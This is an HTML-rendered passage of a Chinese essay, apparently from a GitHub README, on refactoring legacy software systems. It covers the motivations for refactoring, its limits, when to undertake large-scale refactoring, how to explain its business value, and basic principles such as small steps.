&lt;li&gt;&lt;a href="#api-%E8%AF%84%E4%BC%B0"&gt;API 评估&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#api-%E6%9E%B6%E6%9E%84%E5%9B%BE"&gt;API 架构图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%AB%98%E5%BC%95%E7%94%A8--%E9%AB%98%E4%BF%AE%E6%94%B9%E5%88%86%E6%9E%90"&gt;高引用 + 高修改分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%B5%8B%E8%AF%95"&gt;测试&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E7%AD%96%E7%95%A5"&gt;重构策略&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E9%87%8D%E6%9E%84"&gt;架构重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%88%86%E5%B1%82%E9%87%8D%E6%9E%84"&gt;分层重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%A8%A1%E5%9E%8B%E9%87%8D%E6%9E%84-1"&gt;模型重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E9%87%8D%E6%9E%84-1"&gt;代码重构&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E9%87%8D%E6%9E%84"&gt;自动化重构&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8D%E6%9E%84%EF%BC%88tbc%EF%BC%89"&gt;数据库重构（TBC）&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%B8%8D%E5%8F%98%E6%80%A7"&gt;数据库回归测试：数据不变性&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%89%8D%E6%B5%8B%E8%AF%95"&gt;前测试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%90%8E%E6%B5%8B%E8%AF%95"&gt;后测试&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%BC%95%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB%E5%B7%A5%E5%85%B7"&gt;引入数据库迁移工具&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%BF%81%E7%A7%BB%E6%BA%90%E6%95%B0%E6%8D%AE"&gt;迁移源数据&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%B1%B2%E5%8F%96%E5%BC%8F%E9%87%8D%E6%9E%84%EF%BC%9A%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E8%BD%AC%E6%8D%A2"&gt;汲取式重构：存储过程转换&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E4%B9%8B%E5%90%8E%EF%BC%9A%E5%B7%A5%E5%85%B7%E7%9A%84%E9%97%AE%E9%A2%98"&gt;重构之后：工具的问题&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E5%AE%88%E6%8A%A4"&gt;架构守护&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%9E%B6%E6%9E%84%E5%AE%88%E6%8A%A4%E6%B5%8B%E8%AF%95"&gt;架构守护测试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9D%8F%E5%91%B3%E9%81%93%E5%AE%88%E6%8A%A4"&gt;坏味道守护&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91"&gt;测试驱动开发&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%AE%8C%E5%96%84%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"&gt;完善基础设施&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E4%B9%8B%E5%90%8E%EF%BC%9A%E8%A7%A3%E5%86%B3%E4%BA%BA%E7%9A%84%E9%97%AE%E9%A2%98"&gt;重构之后：解决人的问题&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E4%BB%A3%E7%A0%81%E5%86%99%E5%BE%97%E7%83%82"&gt;代码写得烂&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%85%BB%E6%88%90%E4%BC%98%E7%A7%80%E7%9A%84%E5%BC%80%E5%8F%91%E4%B9%A0%E6%83%AF"&gt;养成优秀的开发习惯&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E4%BA%BA%E5%91%98%E8%83%BD%E5%8A%9B%E6%8F%90%E5%8D%87"&gt;人员能力提升&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%BB%83%E4%B9%A0%E9%A1%B9%E7%9B%AE"&gt;练习项目&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9F%B9%E8%AE%AD%E6%95%99%E7%A8%8B"&gt;培训教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98"&gt;典型问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E4%B9%8B%E5%90%8E%EF%BC%9A%E6%B5%81%E7%A8%8B%E7%9A%84%E9%97%AE%E9%A2%98"&gt;重构之后：流程的问题&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E6%B5%81%E7%A8%8B%E4%BC%98%E5%8C%96"&gt;流程优化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%9C%80%E6%B1%82%E8%A7%84%E8%8C%83%E5%8C%96"&gt;需求规范化&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E9%9C%80%E6%B1%82"&gt;实例化需求&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E8%A1%8C%E4%B8%BA%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%EF%BC%88bdd%EF%BC%89"&gt;行为驱动开发（BDD）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E4%B9%8B%E5%90%8E%EF%BC%9A%E6%8F%90%E7%82%BC%E7%9F%A5%E8%AF%86"&gt;重构之后：提炼知识&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E7%9F%A5%E8%AF%86%E4%BB%93%E5%BA%93"&gt;知识仓库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E5%BB%BA%E7%9F%A5%E8%AF%86%E4%BB%93%E5%BA%93"&gt;重建知识仓库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%97%AE%E9%A2%98%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"&gt;问题是什么？&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E9%87%8D%E6%9E%84%EF%BC%9F"&gt;为什么我们需要重构？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E9%87%8D%E6%9E%84%E5%88%B0%E5%BE%AE%E6%9C%8D%E5%8A%A1"&gt;重构到微服务&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%9C%AA%E6%9D%A5"&gt;未来&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#%E8%BF%BD%E6%B1%82%E6%8A%80%E6%9C%AF%E5%8D%93%E8%B6%8A%E3%80%82"&gt;追求技术卓越。&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%8E%A8%E5%8A%A8%E4%B8%AA%E4%BA%BA%E5%8F%98%E9%9D%A9%EF%BC%8C%E8%BF%9B%E8%80%8C%E5%BC%95%E9%A2%86%E7%BB%84%E7%BB%87%E5%8F%98%E9%9D%A9"&gt;推动个人变革，进而引领组织变革&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E6%95%B4%E7%90%86%E7%9F%A5%E8%AF%86%EF%BC%8C%E5%8A%A0%E5%BC%BA%E6%95%99%E8%82%B2"&gt;整理知识，加强教育&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#%E5%9C%A8%E6%95%B4%E4%B8%AA%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%B0%86%E4%BB%B7%E5%80%BC%E5%88%9B%E9%80%A0%E6%9C%80%E5%A4%A7%E5%8C%96"&gt;在整个流程中将价值创造最大化&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-再说遗留系统重构" class="anchor" aria-hidden="true" href="#再说遗留系统重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;再说遗留系统重构&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;当你试图对工作方式进行这些改进时，政治斗争可能抬起它丑陋的头——《拥抱变革：从优秀走向卓越的 48 个组织转型模式》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;4 年前，也就是 2016 年，我一直在思索着如何更好的构建软件？如何更好的重写软件系统？思索出了 RePractise 七步曲，顺带着写了那本《全栈应用开发：精益实践》。书中，对于遗留系统的建议，便是&lt;strong&gt;重写&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;而在我的最近一本书《&lt;a href="https://book.douban.com/subject/33477112/" rel="nofollow"&gt;前端架构：从入门到微前端&lt;/a&gt;》中，我提及到了五种前端架构的改进方式：更新、迁移、重构、重写、重搭。重写，依旧是我推荐的主要方式，技术栈老旧、旧有代码不规范。&lt;/p&gt;
&lt;p&gt;可是呢，随着岁月的流失，我发现重写并不能大部分的解决问题。&lt;/p&gt;
&lt;p&gt;我总以为，编写软件的的人会随着年龄的增长，写出更好的软件系统。然而，软件开发者在经历到了 3 ~ 5 年的职业编码之后，有些成为了技术管理者，写不下去的转行、在线炒粉去了，还有的 &lt;code&gt;return true&lt;/code&gt; 成为了销售……，剩下的，还有那个不断接锅的 Tech Lead（还在继续写代码）。就好像韭菜一样，总可以吃掉新鲜的，总会由新的人来开发新的系统。所以，《重构：改善既有代码的设计》总是能割到一波又一波的韭菜 —— 那个会重构的人，代码写得少了。&lt;/p&gt;
&lt;p&gt;时过境迁，我对软件开发又有一些新的领悟：重构比重写更有挑战性。或许是重写和新写没有区别，或者是经历了一个个系统的重构过程，我大抵是明白了：&lt;strong&gt;哪来的和旧系统划清界线&lt;/strong&gt;。系统腐烂时，没有人能说清整个系统，甚至于一半的功能都相当的困难。与此同时，或许系统的用户对系统的功能比你更加了解。因为，你会从他们那收到 bug 的反馈：以前不是有这个功能吗，非常好用 —— 用户可能会骗你，他/她经常用那个功能，但是那个功能是存在的。&lt;/p&gt;
&lt;p&gt;从旧系统中汲取知识，一个逃离不了的话题，一个永远的痛。系统重构并不是一个简单的活，我们要不断地平衡：业务开发与重构过程，并尽量保证业务优先。它还涉及到一系列的软件开发实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建重构防护网，保证重构过程的安全性&lt;/li&gt;
&lt;li&gt;可随时继续的重构演进策略&lt;/li&gt;
&lt;li&gt;评估&lt;/li&gt;
&lt;li&gt;API 设计合理性评估&lt;/li&gt;
&lt;li&gt;模块分层架构&lt;/li&gt;
&lt;li&gt;架构合理度评估与对应的改进方案&lt;/li&gt;
&lt;li&gt;公共代码的拆分策略&lt;/li&gt;
&lt;li&gt;面向过程代码转面向对象&lt;/li&gt;
&lt;li&gt;代码坏味道识别与代码重构&lt;/li&gt;
&lt;li&gt;合适的设计模式替换旧的散弹式修改&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也因此，在先前提到的 5 种方式中，重构可以说是最难的一种。设计新的架构很容易，但是要重构到设计模式，重构到领域驱动设计，重构到到整洁的架构，并不是一件容易的事情。你需要持续不断地练习，但是这样的机会并不多。&lt;/p&gt;
&lt;p&gt;可重构到最后，我们还会再回过头来看这些问题。我们的重点应该是：解决提出问题的人。正是那些能力不够的开发人员，导致了我们的系统需要一次大规模的重构。&lt;/p&gt;
&lt;p&gt;那么，正确的做法，应该是在日常的开发中不断重构，并引入技术债看板，不断优化和解决这些技术债。故而，技术债管理优于重构。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-为什么重构" class="anchor" aria-hidden="true" href="#为什么重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;为什么重构？&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;重构（名词）：对软件内部结构的一种调整，目的是在不改变软件可观察行为的前提下，提高其可理解性，降低其修改成本。 重构（动词）：使用一系列重构手法，在不改变软件可观察行为的前提下，调整其结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从定义上来说，重构意味着，我们不能改变现有软件的行为，你的 bug 还应该是 bug。只是呢，我们可以顺带着修复这个 bug，但是它绝不能冠上重构的名义。如此一来，怕是会被人误解。&lt;/p&gt;
&lt;p&gt;既然，不添加新的功能，也不减少现有的功能，那对于业务系统来说有什么价值呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;重构的唯一目的就是让我们开发更快，用更少的工作量创造更大的价值。—— 《重构：改善既有代码的设计》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以，总的来说，重构是为了 &lt;code&gt;￥￥￥&lt;/code&gt;。如果不能创造更多的价值，那么你在扯什么犊子的重构。但是，这种价值往往都不是直接体现。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构的动机" class="anchor" aria-hidden="true" href="#重构的动机"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构的动机&lt;/h3&gt;
&lt;p&gt;我知道你已经熟悉了这些说辞，而我也是复制过来的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;改善既有代码的设计。副标题是最好的说明。&lt;/li&gt;
&lt;li&gt;帮助找到软件中的 bug。review 旧有代码的过程中，会发现一些不符合业务的代码。&lt;/li&gt;
&lt;li&gt;提升开发效率。让代码易于扩展&lt;/li&gt;
&lt;li&gt;提高编程的趣味性——《重构与模式》&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我也懒得打了。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构不一定能带来什么" class="anchor" aria-hidden="true" href="#重构不一定能带来什么"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构不一定能带来什么？&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;重构的投入与回报并非呈线性关系。—— 《领域驱动设计：软件核心复杂性应对之道》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;人们总以为重构能带来：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;更少的代码&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;更稳定的系统&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它们都是&lt;strong&gt;可能&lt;/strong&gt;带来的效果，而不是一定会。如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当我们拆分一个上帝类的时候，我们可能拆出了三个类、四个类，因为那些 import、package、type 的 declaration，反而带来了更多的代码。&lt;/li&gt;
&lt;li&gt;而当我们发现重复代码，并且它们是可被抽象的，那么我们就可以消去一半的代码。&lt;/li&gt;
&lt;li&gt;如果我们在重构的过程中，发现 bug，那么必然系统会更加稳定。&lt;/li&gt;
&lt;li&gt;而如果因为我们重构，导致别人合并代码时发生冲突，反而可能会带来 bug。&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们是基于一系列的假设，才有了对应的结果描述。&lt;/p&gt;
&lt;p&gt;而尽管我们达不成上述的好处，但我们仍然可以追求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;编程的技艺&lt;/strong&gt;。稳定的业务代码，便容易选择合理的识别设计模式。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;重构的手法&lt;/strong&gt;。是的，如果你持续练习的话。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;持续重构的意识&lt;/strong&gt; 。我们真正意思到烂代码带来的问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模式和原则&lt;/strong&gt;。遇到相似的情况时，可以用相似的重构手法。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;抽象能力&lt;/strong&gt;。后期总结，往往比前期更易于实践。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总的来说，它带来了更好的效果。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重构是一种文化" class="anchor" aria-hidden="true" href="#重构是一种文化"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构是一种文化&lt;/h3&gt;
&lt;p&gt;日常的开发中，如果你说出你要重构的时候，有人对此挑战的话，那么说明需要培养相应的文化 —— 程序员的匠艺。好的代码不是一把写出来的，而是持续的演进和重构出来的&lt;/p&gt;
&lt;p&gt;如果有开发人员，经常提出需要重构的时候，你要看看是否真的合理。&lt;/p&gt;
&lt;p&gt;持续在在日常开发中进行小重构，应该是开发人员的一种&lt;strong&gt;自我修养&lt;/strong&gt;。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-大规模重构的时机" class="anchor" aria-hidden="true" href="#大规模重构的时机"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;大规模重构的时机&lt;/h3&gt;
&lt;p&gt;对于大规模重构来说 ，一个最为常见的例子是：在接手别人或者别的系统的代码。觉得原有的代码不符合现有团队的风格，不满足再有的开发习惯。但是，根据我的观察，开发人员往往只是在改造系统，而非真正意义上的重构。&lt;/p&gt;
&lt;p&gt;把握重构的时机是很难的一件事情，特别是如果你要进行大的系统改动，如果没有出现真正的痛点。那么，即使我们觉得诸多设计不合理的地方，我们往往可能并不被允许重构，也没有时间进行重构。可一旦连业务人员，也觉得系统需要重构的时候，那么系统也许需要重写了。&lt;/p&gt;
&lt;p&gt;即便于对未来有价值，我们也仍需要等待更合适的时机，如：代码库拆分、整洁架构中的领域层拆分等等。我们都知道它们带来的好处，但是我们尚没有那么迫切。反而，因为拆分，我们可能会带来额外的重构成本和维护成本。如我之前在重构 &lt;a href="https://github.com/phodal/coca"&gt;Coca&lt;/a&gt; 的时候，我在拆分 domain 层的时候，显得没有价值。我花了一两天的时间，把依赖于操作系统的部分，从代码中剥离了出去。我只是在试验 domain 层的好处，但是我并没有办法直接证明它的好处。&lt;/p&gt;
&lt;p&gt;直到，我开始为 Coca 添加 WASM 支持的时候，编译成功了。并且，拆分之后，构建出来的 wasm 包的大小减少到原来的一半，因为有大量的依赖是我所不需要的。如果按正常的重构逻辑，应该是在我们在未来计划添加 WASM 的时候，架构师才允许我们拆分出来。&lt;/p&gt;
&lt;p&gt;我们不应该做大规模预先的设计，也不应该过度的设计；我们也没有理由做大规模的预先重构设计，准备好方案，在时间恰当的时候，实施方案。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-说清重构的价值" class="anchor" aria-hidden="true" href="#说清重构的价值"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;说清重构的价值&lt;/h3&gt;
&lt;p&gt;重构，无法在短期内创造价值，哪怕是创造了大量的价值，它也难以&lt;strong&gt;直接&lt;/strong&gt;体现出来。它可以提升代码的可读性，可维护性……，但是总的来说，它是在以特定的方式降低系统的维护成本。&lt;/p&gt;
&lt;p&gt;再说说可维护性，比如，你使用了更好的设计模式代替了复制、粘贴，它可能还不如原来的代码生成器好用。开发的过程快了，维护就是一坨屎。所以，我说没有维护过旧系统的人，不懂得重构的好处。白天不懂得夜的美。&lt;/p&gt;
&lt;p&gt;既然如此，让我们就再考虑一下重构的价值。我想了很久这个问题，直到我从《遗留系统重构指南》看到一些示例：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;阶段&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;业务价值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;初步重构。定义组件接口，将组件拆分为独立的 jar&lt;/td&gt;
&lt;td&gt;清晰的接口能增加代码的可维护性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;重写身份认证。更改密码的存储方式&lt;/td&gt;
&lt;td&gt;更好地遵守数据安全法规&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;重写搜索组件。切换到不同的搜索引擎实现&lt;/td&gt;
&lt;td&gt;搜索结果质量更好。用户更容易找到产品&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;重构推荐组件。&lt;/td&gt;
&lt;td&gt;可以快速地切换不同的算法&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;不过，仍旧存在大量的难以描述的价值——至少我是不知道从何说起。这里的代码、架构有坏味道，得去重构，便是我，一个工程师的思维。只是呢，真正有意义的业务价值，都是 TBC……。&lt;/p&gt;
&lt;p&gt;尽管我们说，重构尽量不要影响业务开发，但是如果正在开发的功能部分，有较大的问题。那么，我们不得不调整策略，优先支持这部分的功能，而不是等完成后，再花费时间来对它们进行重构。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-系统重构模式与原则" class="anchor" aria-hidden="true" href="#系统重构模式与原则"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;系统重构模式与原则&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;设计模式强调为开发大规模系统提供可复用的设计指南。 ——  《反模式：危机中软件、架构和项目的重构》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就重构的基本原则来说，倒也不是很复杂：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小步前进。走一小步，提交一次代码，方便回滚，有一天你会懂的。&lt;/li&gt;
&lt;li&gt;随时可用。如果不能保证随时可用，那就说不上是重构了。&lt;/li&gt;
&lt;li&gt;融入日常。&lt;/li&gt;
&lt;/ul&gt;
